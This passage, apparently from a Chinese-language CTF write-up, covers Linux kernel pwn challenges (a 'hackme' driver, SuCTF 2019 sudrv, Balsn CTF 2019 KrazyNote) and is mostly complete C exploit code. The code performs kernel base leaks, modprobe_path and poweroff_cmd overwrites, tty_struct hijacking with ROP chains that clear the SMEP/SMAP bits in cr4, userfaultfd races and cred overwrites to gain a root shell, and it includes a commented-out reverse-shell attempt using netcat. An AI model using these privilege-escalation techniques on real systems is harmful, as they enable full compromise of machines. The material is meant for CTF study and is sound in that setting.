new(fd,0,buf,0x100,0); new(fd,1,buf,0x100,0); uread(fd,1,buf,0x20,-0x20); size_t mod_base = *(size_t*)buf - 0x6000; printf("[:)]mod_base = %p\n",mod_base); delete(fd,0,buf,0,0); *(size_t*)buf = mod_base+0x2440; uwrite(fd,2,buf,0x100,-0x100); memset(buf,'\x00',0x100); new(fd,0,buf,0x100,0); new(fd,3,buf,0x100,0); //ffffffff8183f960 D modprobe_path 81 size_t modprobe_path = kernel_base + 0x83f960; printf("[:)]modprobe_path_addr = %p\n",modprobe_path); //直接cat /flag成功 *(size_t*)buf = modprobe_path; *((size_t*)buf+1) = strlen("/home/pwn/xxrw.sh")+1; uwrite(fd,3,buf,0x10,0); memset(buf,'\x00',0x1000); strcpy(buf,"/home/pwn/xxrw.sh"); uwrite(fd,4,buf,strlen(buf)+1,0); system("echo -ne '#!/bin/sh\n/bin/chmod 777 /flag\n' &gt; /home/pwn/xxrw.sh"); system("/bin/chmod +x /home/pwn/xxrw.sh"); system("echo -ne '\\xff\\xff\\xff\\xff' &gt; /trigger"); system("/bin/chmod +x /trigger"); system("/trigger"); system("cat /flag"); /* 反弹shell失败 *(size_t*)buf = modprobe_path; *((size_t*)buf+1) = strlen("/reverse")+1; uwrite(fd,3,buf,0x10,0); memset(buf,'\x00',0x1000); strcpy(buf,"/reverse"); uwrite(fd,4,buf,strlen(buf)+1,0); system("echo -ne '\\xff\\xff\\xff\\xff' &gt; /trigger"); system("/bin/chmod +x /trigger"); if(fork() == 0)&#123; system("/trigger"); exit(0); &#125; system("nc -lp 2333"); */ return 0;&#125; 其他解法二：tty_struct &amp;&amp; 栈迁移：修改tty_struct的ops指针原先存有内核基址，可利用其来泄露内核基址，然后将其改为内核堆中的可控地址，也就是我们申请到的chunk的地址，然后在那个地址构造fake_tty_operation，劫持write函数即可。栈迁移用到的gadget为： 12345678910.text:FFFFFFFF81200F66 mov rsp, rax.text:FFFFFFFF81200F69 jmp loc_FFFFFFFF81200EE7.text:FFFFFFFF81200EE7 pop r12.text:FFFFFFFF81200EE9 mov rdi, rsp.text:FFFFFFFF81200EEC call sub_FFFFFFFF81016190.text:FFFFFFFF81200EF1 mov rsp, rax.text:FFFFFFFF81200EF4 lea rbp, [rsp+70h+var_6F].text:FFFFFFFF81200EF9 push r12.text:FFFFFFFF81200EFB retn 需要注意的是因为开启了smap，内核态无法访问用户空间数据，所以ropchain需要放在内核内存中，我们这里正好放在申请到的堆块中。 exp：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153#include &lt;stdio.h&gt;#include &lt;pthread.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;fcntl.h&gt;size_t prepare_kernel_cred = 0;size_t commit_creds = 0;struct chunk&#123; size_t index; char* buf; long long size; long long offset;&#125;;struct chunk* user_chunk;void uread(int fd,int index,char* buf,long long size,long long offset)&#123; user_chunk-&gt;index = (size_t)index; user_chunk-&gt;buf = buf; user_chunk-&gt;size = size; user_chunk-&gt;offset = offset; ioctl(fd,0x30003,user_chunk);&#125;void uwrite(int fd,int index,char* buf,long long size,long long offset)&#123; user_chunk-&gt;index = (size_t)index; user_chunk-&gt;buf = buf; user_chunk-&gt;size = size; user_chunk-&gt;offset = offset; ioctl(fd,0x30002,user_chunk);&#125;void new(int fd,int index,char* buf,long long size,long long offset)&#123; user_chunk-&gt;index = (size_t)index; user_chunk-&gt;buf = buf; user_chunk-&gt;size = size; user_chunk-&gt;offset = offset; ioctl(fd,0x30000,user_chunk);&#125;void delete(int fd,int index,char* buf,long long size,long long offset)&#123; user_chunk-&gt;index = (size_t)index; user_chunk-&gt;buf = buf; user_chunk-&gt;size = size; user_chunk-&gt;offset = offset; ioctl(fd,0x30001,user_chunk);&#125;size_t get_shell_addr = (size_t)get_shell;void get_shell()&#123; if(getuid() == 0)&#123; puts("[:)]Root now!!!"); system("/bin/sh"); exit(0); &#125; else&#123; puts("[:(]Not root..."); exit(0); &#125;&#125;size_t user_cs,user_ss,user_rsp,user_rflags;void save()&#123; __asm__( "mov user_cs,cs;" "mov user_ss,ss;" "mov user_rsp,rsp;" "pushf;" "pop user_rflags;" ); puts("[:)]Save success!!!");&#125;void su()&#123; char* (*pkc)(int) = prepare_kernel_cred; void (*cc)(char*) = commit_creds; (*cc)((*pkc)(0)); __asm__( "push user_ss;" "push user_rsp;" "push user_rflags;" "push user_cs;" "push get_shell_addr;" "swapgs;" "iretq;" );&#125;int main()&#123; save(); int fd = open("/dev/hackme",0); if(fd &lt; 0 )&#123; printf("[:(]Open error...\n"); exit(-1); &#125; user_chunk = (struct chunk*)malloc(sizeof(struct chunk)); char* buf = malloc(0x2000); memset(buf,'0',0x400); new(fd,0,buf,0x400,0); memset(buf,'1',0x400); new(fd,1,buf,0x400,0); memset(buf,'2',0x400); new(fd,2,buf,0x400,0); delete(fd,0,buf,0,0); delete(fd,1,buf,0,0); uread(fd,2,buf,0x400,-0x400); size_t heap_base = *(size_t*)buf; printf("[:)]heap_base = %p\n",heap_base); int ptmx_fd = open("/dev/ptmx",2); if(ptmx_fd &lt; 0)&#123; puts("[:(]Open ptmx error..."); exit(0); &#125; uread(fd,2,buf,0x400,-0x400); if(*(size_t*)buf != 0x0000000100005401)&#123; puts("[:(]Alloc ptmx error..."); exit(0); &#125; size_t kernel_base = *((size_t*)buf+3) - 0x625d80; printf("[:)]kernel_base = %p\n",kernel_base); prepare_kernel_cred = 0x4d3d0 + kernel_base; commit_creds = 0x4d220 + kernel_base; *((size_t*)buf+3) = heap_base + 0x800; uwrite(fd,2,buf,0x400,-0x400); *(size_t*)buf = kernel_base + 0x1b5a1; //pop rax; ret; *((size_t*)buf+1) = 0x6f0; *((size_t*)buf+2) = kernel_base + 0x252b; //mov cr4, rax; push rcx; popfq; pop rbp; ret; *((size_t*)buf+3) = 0xdeadbeef; *((size_t*)buf+4) = (size_t)su; *((size_t*)buf+7) = kernel_base + 0x200f66; //mov rsp,rax;.........; uwrite(fd,2,buf,0x40,0); memset(buf,'\x00',8); write(ptmx_fd,buf,8); return 0;&#125; 其他解法三：userfaultfd：经过几次尝试发现cred有时会出现在chunk_addr之前，有时会出现在chunk_addr之后，但绝大部分情况是在其之前，且相距距离都在0x160000之内（0x17a500-0x25d00 = 0x154800）： 在后面的情况： 然后就可以通过越界向前读，读出cred的内容来，用8个1000来过滤，然后将8个1000全改为0后，再写回内核内存，因为中间有hole，会触发缺页中断，利用userfaultfd机制使用户态在自定义处理缺页中断时卡住，使提前准别好的子进程一直不断尝试拿shell。但是貌似不是很稳定，大概运行三到四次exp会成功一次，其他情况会卡住。 exp：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166#include &lt;stdio.h&gt;#include &lt;pthread.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/mman.h&gt;#include &lt;errno.h&gt;#include &lt;signal.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;stdint.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;linux/userfaultfd.h&gt;#include &lt;poll.h&gt;#include &lt;assert.h&gt;#define max 0x160000#define search 0x10000struct chunk&#123; size_t index; char* buf; long long size; long long offset;&#125;;struct chunk* user_chunk;void uread(int fd,int index,char* buf,long long size,long long offset)&#123; user_chunk-&gt;index = (size_t)index; user_chunk-&gt;buf = buf; user_chunk-&gt;size = size; user_chunk-&gt;offset = offset; ioctl(fd,0x30003,user_chunk);&#125;void uwrite(int fd,int index,char* buf,long long size,long long offset)&#123; user_chunk-&gt;index = (size_t)index; user_chunk-&gt;buf = buf; user_chunk-&gt;size = size; user_chunk-&gt;offset = offset; ioctl(fd,0x30002,user_chunk);&#125;void new(int fd,int index,char* buf,long long size,long long offset)&#123; user_chunk-&gt;index = (size_t)index; user_chunk-&gt;buf = buf; user_chunk-&gt;size = size; user_chunk-&gt;offset = offset; ioctl(fd,0x30000,user_chunk);&#125;void delete(int fd,int index,char* buf,long long size,long long offset)&#123; user_chunk-&gt;index = (size_t)index; user_chunk-&gt;buf = buf; user_chunk-&gt;size = size; user_chunk-&gt;offset = offset; ioctl(fd,0x30001,user_chunk);&#125;void get_root()&#123; while(1)&#123; sleep(2); if(getuid() == 0)&#123; puts("[:)]Root now!!!"); system("/bin/sh"); exit(0); &#125; &#125;&#125;void handle(void* uffd)&#123; struct pollfd mypollfd; mypollfd.fd = (unsigned long)uffd; mypollfd.events = POLLIN; int re = poll(&amp;mypollfd,1,-1); if(re &lt;= 0)&#123; puts("[:(]Catch error..."); exit(0); &#125; puts("[:)]Struck the pagefault!!!"); sleep(1000);&#125;void register_uttd(uint64_t fault_page,uint64_t fault_page_size)&#123; struct uffdio_api myapi; struct uffdio_register myuffd; pthread_t pt; int uffd = syscall(__NR_userfaultfd,O_CLOEXEC|O_NONBLOCK); myapi.api = UFFD_API; myapi.features = 0; if(ioctl(uffd,UFFDIO_API,&amp;myapi) == -1)&#123; puts("[:(]Api error..."); exit(-1); &#125; myuffd.range.start = fault_page; myuffd.range.len = fault_page_size; myuffd.mode = UFFDIO_REGISTER_MODE_MISSING; if(ioctl(uffd,UFFDIO_REGISTER,&amp;myuffd) == -1)&#123; puts("[:(]Register error..."); exit(-1); &#125; int re = pthread_create(&amp;pt,NULL,handle,(void*)uffd); if(re != 0)&#123; puts("[:(]Create pthread error..."); exit(-1); &#125;&#125;int main()&#123; int fd = open("/dev/hackme",0); if(fd &lt; 0 )&#123; printf("[:(]Open error...\n"); exit(-1); &#125; user_chunk = (struct chunk*)malloc(sizeof(struct chunk)); for(int i = 0;i &lt; 20;i++)&#123; if(fork() == 0)&#123; get_root(); &#125; &#125; char* buf = malloc(max); new(fd,0,buf,0x100,0); uread(fd,0,buf,max,-max); int* search_ptr = (int*)buf; size_t offset = 0; for(int i = 0;i &lt; search/4;i++)&#123; if(search_ptr[i]==1000 &amp;&amp; search_ptr[i+1]==1000 &amp;&amp; search_ptr[i+2]==1000 &amp;&amp; search_ptr[i+3]==1000 &amp;&amp; search_ptr[i+4]==1000 &amp;&amp; search_ptr[i+5]==1000 &amp;&amp; search_ptr[i+6]==1000 &amp;&amp; search_ptr[i+7]==1000)&#123; puts("[:)]Find cred!!!"); offset = i*4; printf("[:)]offset = %p\n",offset); for(int j = 0;j &lt; 8;j++)&#123; search_ptr[i+j] = 0; &#125; break; &#125; &#125; if(offset == 0)&#123; puts("[:(]Not find..."); &#125; char* mmap_addr = mmap(NULL,max,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0); memcpy(mmap_addr,buf,search); uint64_t fault_page = mmap_addr + search; uint64_t fault_page_size = max - search; register_uttd(fault_page,fault_page_size); uwrite(fd,0,mmap_addr,max,-max); get_root(); return 0;&#125; 卡住时： 其他解法四：race：看到初始化时开了多核多线程，就考虑到会有竞争问题，可以用一个子进程去触发缺页中断，使驱动在copy_from_user那一步卡住，从而使得指针更新而size未更新，产生溢出漏洞，再劫持tty_struct即可。 exp：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225#include &lt;stdio.h&gt;#include &lt;pthread.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/mman.h&gt;#include &lt;errno.h&gt;#include &lt;signal.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;stdint.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;linux/userfaultfd.h&gt;#include &lt;poll.h&gt;#include &lt;assert.h&gt;size_t prepare_kernel_cred = 0;size_t commit_creds = 0;struct chunk&#123; size_t index; char* buf; long long size; long long offset;&#125;;struct chunk* user_chunk;void uread(int fd,int index,char* buf,long long size,long long offset)&#123; user_chunk-&gt;index = (size_t)index; user_chunk-&gt;buf = buf; user_chunk-&gt;size = size; user_chunk-&gt;offset = offset; ioctl(fd,0x30003,user_chunk);&#125;void uwrite(int fd,int index,char* buf,long long size,long long offset)&#123; user_chunk-&gt;index = (size_t)index; user_chunk-&gt;buf = buf; user_chunk-&gt;size = size; user_chunk-&gt;offset = offset; ioctl(fd,0x30002,user_chunk);&#125;void new(int fd,int index,char* buf,long long size,long long offset)&#123; user_chunk-&gt;index = (size_t)index; user_chunk-&gt;buf = buf; user_chunk-&gt;size = size; user_chunk-&gt;offset = offset; ioctl(fd,0x30000,user_chunk);&#125;void delete(int fd,int index,char* buf,long long size,long long offset)&#123; user_chunk-&gt;index = (size_t)index; user_chunk-&gt;buf = buf; user_chunk-&gt;size = size; user_chunk-&gt;offset = offset; ioctl(fd,0x30001,user_chunk);&#125;size_t user_cs,user_ss,user_rsp,user_rflags;void save()&#123; __asm__( "mov user_cs,cs;" "mov user_ss,ss;" "mov user_rsp,rsp;" "pushf;" "pop user_rflags;" ); puts("[:)]Save success!!!");&#125;void get_shell()&#123; if(getuid() == 0)&#123; puts("[:)]Root now!!!"); system("/bin/sh"); exit(0); &#125; else&#123; puts("[:(]Not root..."); exit(0); &#125;&#125;size_t get_shell_addr = (size_t)get_shell;void su()&#123; char* (*pkc)(int) = prepare_kernel_cred; void (*cc)(char*) = commit_creds; (*cc)((*pkc)(0)); __asm__( "push user_ss;" "push user_rsp;" "push user_rflags;" "push user_cs;" "push get_shell_addr;" "swapgs;" "iretq;" );&#125;void handle(void* uffd)&#123; struct pollfd mypollfd; mypollfd.fd = (unsigned long)uffd; mypollfd.events = POLLIN; int re = poll(&amp;mypollfd,1,-1); if(re &lt;= 0)&#123; puts("[:(]Catch error..."); exit(0); &#125; puts("[:)]Struck the pagefault!!!"); sleep(1000);&#125;void register_uffd(uint64_t fault_page,uint64_t fault_page_size)&#123; struct uffdio_api myapi; struct uffdio_register myuffd; pthread_t pt; int uffd = syscall(__NR_userfaultfd,O_CLOEXEC|O_NONBLOCK); myapi.api = UFFD_API; myapi.features = 0; if(ioctl(uffd,UFFDIO_API,&amp;myapi) == -1)&#123; puts("[:(]Api error..."); exit(-1); &#125; myuffd.range.start = fault_page; myuffd.range.len = fault_page_size; myuffd.mode = UFFDIO_REGISTER_MODE_MISSING; if(ioctl(uffd,UFFDIO_REGISTER,&amp;myuffd) == -1)&#123; puts("[:(]Register error..."); exit(-1); &#125; int re = pthread_create(&amp;pt,NULL,handle,(void*)uffd); if(re != 0)&#123; puts("[:(]Create pthread error..."); exit(-1); &#125;&#125;int main()&#123; save(); int fd = open("/dev/hackme",0); if(fd &lt; 0 )&#123; printf("[:(]Open error...\n"); exit(-1); &#125; user_chunk = (struct chunk*)malloc(sizeof(struct chunk)); char* buf = malloc(0x200000); new(fd,0,buf,0x200000,0); delete(fd,0,buf,0,0); if(fork() == 0)&#123; char* mmap_addr = mmap(NULL,0x1000,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0); uint64_t fault_page = mmap_addr; uint64_t fault_page_size = 0x1000; register_uffd(fault_page,fault_page_size); new(fd,0,mmap_addr,0x400,0); &#125; else&#123; sleep(2); int ptmx_fd = open("/dev/ptmx",2); if(ptmx_fd &lt; 0)&#123; puts("[:(]OPen ptmx error..."); exit(-1); &#125; uread(fd,0,buf,0x200000,0); size_t *search_ptr = (size_t*)buf; size_t offset = 0; char* temp = malloc(0x200); for(int i = 0;i &lt; 0x200000/8;i += 0x200/8)&#123; for(int j = 0;j &lt; 0x200/8;j++)&#123; if(search_ptr[i+j] == 0x100005401)&#123; puts("[:)]Find tty_struct!!!"); printf("[:)]offset = %p\n",(i+j)*8); offset = (i+j)*8; memcpy(temp,search_ptr+i+j,0x200); break; &#125; &#125; if(offset != 0)&#123; break; &#125; &#125; size_t kernel_base = search_ptr[offset/8 + 3]-0x625d80; printf("[:)]kernel_base = %p\n",kernel_base); prepare_kernel_cred = 0x4d3d0 + kernel_base; commit_creds = 0x4d220 + kernel_base; size_t heap_base = search_ptr[offset/8 + 7]-0xe15b438; printf("[:)]heap_base = %p\n",heap_base); search_ptr[2] = kernel_base + 0x1b5a1; //pop rax; ret; search_ptr[3] = 0x6f0; search_ptr[4] = kernel_base + 0x252b; //mov cr4, rax; push rcx; popfq; pop rbp; ret; search_ptr[5] = 0xdeadbeef; search_ptr[6] = (size_t)su; search_ptr[16] = kernel_base + 0x484f0; //pop rsp;ret; search_ptr[17] = heap_base + 0xe15b010; search_ptr[23] = kernel_base + 0x200f66; //mov rsp,rax;.........; search_ptr[offset/8 + 3] = heap_base + 0xe15b080; uwrite(fd,0,buf,0x420,0); memset(buf,'\x00',8); write(ptmx_fd,buf,8); &#125; return 0;&#125; 2019SuCTF_sudrv解法一：改task_prctl.hook和poweroff_cmd，难点在于这两个变量的寻找。 poweroff_cmd可在ida中寻找字符串，或是在gdb中用find寻找。 hook需要我们动态调试，需要注意的是，不同版本的内核情况有很大差异，可能找到它需要花一些功夫和猜测。 最终的exp也不是很稳定。。。有时会失败，有事会崩溃，和内核堆的内存有关应该。 exp：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;fcntl.h&gt;#include &lt;signal.h&gt;#include &lt;unistd.h&gt;#include &lt;poll.h&gt;void uread(int fd)&#123; ioctl(fd,0xDEADBEEF,0);&#125;void new(int fd,int size)&#123; ioctl(fd,0x73311337,size);&#125;void delete(int fd)&#123; ioctl(fd,0x13377331,0);&#125;void get_shell()&#123; if(getuid() == 0)&#123; puts("[:)]Root now!!!"); system("/bin/sh"); exit(0); &#125; else&#123; puts("[:(]Not root..."); exit(0); &#125;&#125;int main()&#123; int fd = open("/dev/meizijiutql",2); if(fd &lt; 0)&#123; puts("[:(]Open error..."); exit(-1); &#125; new(fd,0x100); char* buf = malloc(0x10000); memset(buf,'\x00',0x10000); strcpy(buf,"%lx%lx%lx%lx%lx%lx %lx%lx%lx%lx %lx%lx "); write(fd,buf,strlen(buf)); uread(fd); close(fd); system("dmesg | grep deadbeef &gt; leak.txt"); FILE* leak_fd = fopen("leak.txt","r"); if(leak_fd &lt; 0)&#123; puts("[:(]Oh..."); exit(-1); &#125; fgets(buf,0x100,leak_fd); unsigned long long kernel_base = strtoull(buf+27,NULL,16) - 0x1c827f; printf("[:)]kernel_base = %p\n",kernel_base); unsigned long long stack_base = strtoull(buf+27+1+17+0x10+0x10,NULL,16); printf("[:)]stack_base = %p\n",stack_base); unsigned long poweroff_cmd = kernel_base + 0x1241d40; printf("[:)]poweroff_cmd = %p\n",poweroff_cmd); unsigned long security_task_prctl = kernel_base + 0x3134e0; unsigned long hook_addr = kernel_base + 0x12934a8; printf("[:)]hook_addr = %p\n",hook_addr); unsigned long poweroff_work_func = kernel_base + 0x82000; fd = open("/dev/meizijiutql",2); if(fd &lt; 0)&#123; puts("[:(]Oh..."); exit(-1); &#125; new(fd,0xc0); *(size_t*)(buf+0xc0) = poweroff_cmd; write(fd,buf,0xc8); new(fd,0xc0); new(fd,0xc0); strcpy(buf,"/bin/chmod 777 /flag"); write(fd,buf,strlen(buf)); new(fd,0x100); *(size_t*)(buf+0x100) = hook_addr; write(fd,buf,0x108); new(fd,0x100); new(fd,0x100); unsigned long fake_table[4] = &#123;0&#125;; fake_table[3] = poweroff_work_func; unsigned long *p = &amp;fake_table; write(fd,&amp;p,8); prctl(poweroff_cmd,2,poweroff_cmd,poweroff_cmd,2); return 0;&#125; 解法二：劫持栈，ROP 溢出修改fd，向栈申请chunk。 exp：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;fcntl.h&gt;#include &lt;signal.h&gt;#include &lt;unistd.h&gt;#include &lt;poll.h&gt;void uread(int fd)&#123; ioctl(fd,0xDEADBEEF,0);&#125;void new(int fd,int size)&#123; ioctl(fd,0x73311337,size);&#125;void delete(int fd)&#123; ioctl(fd,0x13377331,0);&#125;size_t prepare_kernel_cred = 0;size_t commit_creds = 0;size_t user_cs,user_ss,user_rsp,user_rflags;void save()&#123; __asm__( "mov user_cs,cs;" "mov user_ss,ss;" "mov user_rsp,rsp;" "pushf;" "pop user_rflags;" ); puts("[:)]Save success!!!");&#125;void get_shell()&#123; if(getuid() == 0)&#123; puts("[:)]Root now!!!"); system("/bin/sh"); exit(0); &#125; else&#123; puts("[:(]Not root..."); exit(0); &#125;&#125;int main()&#123; save(); signal(SIGSEGV,get_shell); int fd = open("/dev/meizijiutql",2); if(fd &lt; 0)&#123; puts("[:(]Open error..."); exit(-1); &#125; new(fd,0x100); char* buf = malloc(0x10000); memset(buf,'\x00',0x10000); strcpy(buf,"%lx%lx%lx%lx%lx%lx %lx%lx%lx%lx %lx%lx "); write(fd,buf,strlen(buf)); uread(fd); close(fd); system("dmesg | grep deadbeef &gt; leak.txt"); FILE* leak_fd = fopen("leak.txt","r"); if(leak_fd &lt; 0)&#123; puts("[:(]Oh..."); exit(-1); &#125; fgets(buf,0x100,leak_fd); unsigned long long kernel_base = strtoull(buf+27,NULL,16) - 0x1c827f; printf("[:)]kernel_base = %p\n",kernel_base); commit_creds = kernel_base + 0x81410; prepare_kernel_cred = kernel_base + 0x81790; unsigned long long stack_base = strtoull(buf+27+1+17+0x10+0x10,NULL,16); printf("[:)]stack_base = %p\n",stack_base); fd = open("/dev/meizijiutql",2); if(fd &lt; 0)&#123; puts("[:(]Oh..."); exit(-1); &#125; for(int i = 0;i &lt; 250;i++)&#123; new(fd,0xff0); &#125; new(fd,0xff0); *(size_t*)(buf+0x1000) = stack_base-(0xd8-0x50); write(fd,buf,0x1008); new(fd,0xff0); new(fd,0xff0); *(size_t*)buf = kernel_base + 0x1388; //pop rdi;ret; *((size_t*)buf+1) = 0x6f0; *((size_t*)buf+2) = kernel_base + 0x4e5b1; //mov cr4, rdi; push rdx; popfq; ret; *((size_t*)buf+3) = kernel_base + 0x1388; *((size_t*)buf+4) = 0; *((size_t*)buf+5) = prepare_kernel_cred; *((size_t*)buf+6) = kernel_base + 0x9e2959; *((size_t*)buf+7) = commit_creds; *((size_t*)buf+8) = kernel_base + 0x1388; *((size_t*)buf+8) = kernel_base + 0xa00d5a; *((size_t*)buf+9) = 0; *((size_t*)buf+10) = kernel_base + 0x21762; *((size_t*)buf+11) = (size_t)get_shell; *((size_t*)buf+12) = user_cs; *((size_t*)buf+13) = user_rflags; *((size_t*)buf+14) = user_rsp; *((size_t*)buf+15) = user_ss; write(fd,buf,0x80); return 0;&#125; 2019BalsnCTF_KrazyNote解法一：修改cred exp：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232// gcc -static -pthread xx.c -g -o xx#define _GNU_SOURCE#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;string.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/mman.h&gt;#include &lt;poll.h&gt;#include &lt;pthread.h&gt;#include &lt;errno.h&gt;#include &lt;signal.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;sys/types.h&gt;#include &lt;linux/userfaultfd.h&gt;#include &lt;pthread.h&gt;#include &lt;poll.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;stdint.h&gt;#define FAULT_PAGE ((void*)0x1337000)int fd;struct user_chunk&#123; size_t index; size_t size; char * buf;&#125;;struct user_chunk* user_ptr;char user_buf[0x1000];void new(size_t size,char* buf)&#123; user_ptr-&gt;size = size; user_ptr-&gt;buf = buf; if(ioctl(fd,0xffffff00,user_ptr) &lt; 0)&#123; puts("[:(]new error..."); exit(-1); &#125; return;&#125;void show(size_t index,char* buf)&#123; user_ptr-&gt;index = index; user_ptr-&gt;buf = buf; if(ioctl(fd,0xffffff02,user_ptr) &lt; 0)&#123; puts("[:(]show error..."); exit(-1); &#125; return;&#125;void delete()&#123; if(ioctl(fd,0xffffff03,user_ptr) &lt; 0)&#123; puts("[:(]delete error..."); exit(-1); &#125; return;&#125;void edit(size_t index,char* buf)&#123; user_ptr-&gt;index = index; user_ptr-&gt;buf = buf; if(ioctl(fd,0xffffff01,user_ptr) &lt; 0)&#123; puts("[:(]edit error..."); exit(-1); &#125; return;&#125;void* handle(void* uffd)&#123; struct pollfd mypollfd; mypollfd.fd = (unsigned long)uffd; mypollfd.events = POLLIN; int re = poll(&amp;mypollfd,1,-1); if(re &lt;= 0)&#123; puts("[:(]Catch error..."); exit(0); &#125; puts("[:)]I catch it!!!"); delete(); new(0,user_buf); //0 new(0,user_buf); //1 struct uffdio_copy uc; memset(user_buf,'\x00',sizeof(user_buf)); user_buf[8] = 0xf0; uc.src = (unsigned long)user_buf; uc.dst = (unsigned long)FAULT_PAGE; uc.len = 0x1000; uc.mode = 0; if(ioctl(uffd,UFFDIO_COPY,&amp;uc) &lt; 0)&#123; puts("[:(]UFFDIO_COPY error..."); exit(-1); &#125; // 恢复执行copy_from_user puts("[:)]UFFDIO_COPY done!!!"); return;&#125;void register_uffd()&#123; struct uffdio_api myapi; struct uffdio_register myuffd; pthread_t pt; int uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK); myapi.api = UFFD_API; myapi.features = 0; if(ioctl(uffd,UFFDIO_API,&amp;myapi) == -1)&#123; puts("[:(]Api error..."); exit(-1); &#125; if(mmap(FAULT_PAGE,0x1000,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0) != FAULT_PAGE)&#123; puts("[:(]mmap error..."); exit(-1); &#125;; myuffd.range.start = FAULT_PAGE; myuffd.range.len = 0x1000; myuffd.mode = UFFDIO_REGISTER_MODE_MISSING; if(ioctl(uffd,UFFDIO_REGISTER,&amp;myuffd) == -1)&#123; puts("[:(]Register error..."); exit(-1); &#125; int re = pthread_create(&amp;pt,NULL,handle,(void*)uffd); if(re != 0)&#123; puts("[:(]Create pthread error..."); exit(-1); &#125;&#125;int main()&#123; fd = open("/dev/note",0); if(fd &lt; 0)&#123; puts("[:(]open error..."); exit(-1); &#125; user_ptr = malloc(0x18); memset(user_buf,'\x00',sizeof(user_buf)); new(0x10,user_buf); //0 register_uffd(); edit(0,FAULT_PAGE); show(1,user_buf); size_t key = *(size_t*)user_buf; printf("[:)]key = %p\n",key); new(0,user_buf); show(1,user_buf); size_t module = *((size_t*)user_buf+2) ^ key; module -= 0x2568; printf("[:)]module = %p\n",module); size_t offset = module + 0x165; size_t* tmp_buf = malloc(0x18); tmp_buf[0] = 0 ^ key; tmp_buf[1] = 4 ^ key; tmp_buf[2] = offset ^ key; edit(1,tmp_buf); size_t page_offset_base_offset = 0; show(2,&amp;page_offset_base_offset); page_offset_base_offset += 0xffffffff00000000; printf("[:)]page_offset_base_offset = %p\n",page_offset_base_offset); tmp_buf[0] = 0 ^ key; tmp_buf[1] = 8 ^ key; tmp_buf[2] = (module + 0x169 + page_offset_base_offset) ^ key; edit(1,tmp_buf); size_t page_offset_base = 0; show(2,&amp;page_offset_base); printf("[:)]page_offset_base = %p\n",page_offset_base); if(prctl(PR_SET_NAME,"xiaoxiaorenwu..") &lt; 0)&#123; puts("[:(]set name error..."); exit(0); &#125; size_t cred_addr = 0; size_t real_cred_addr = 0; for(size_t i = 0;;i += 0x100)&#123; tmp_buf[0] = 0 ^ key; tmp_buf[1] = 0xff ^ key; tmp_buf[2] = i ^ key; edit(1,tmp_buf); memset(user_buf,'\x00',0x100); show(2,user_buf); size_t result = memmem(user_buf,0x100,"xiaoxiaorenwu..",0x10); if(result)&#123; cred_addr = *(size_t*)(result-8); real_cred_addr = *(size_t*)(result-0x10); if(cred_addr == real_cred_addr)&#123; printf("[:)]cred_addr = %p\n",cred_addr); break; &#125; &#125; &#125; if(cred_addr == 0)&#123; puts("[:(]not find..."); exit(-1); &#125; tmp_buf[0] = 0 ^ key; tmp_buf[1] = 0x20 ^ key; tmp_buf[2] = (cred_addr+4-page_offset_base) ^ key; edit(1,tmp_buf); 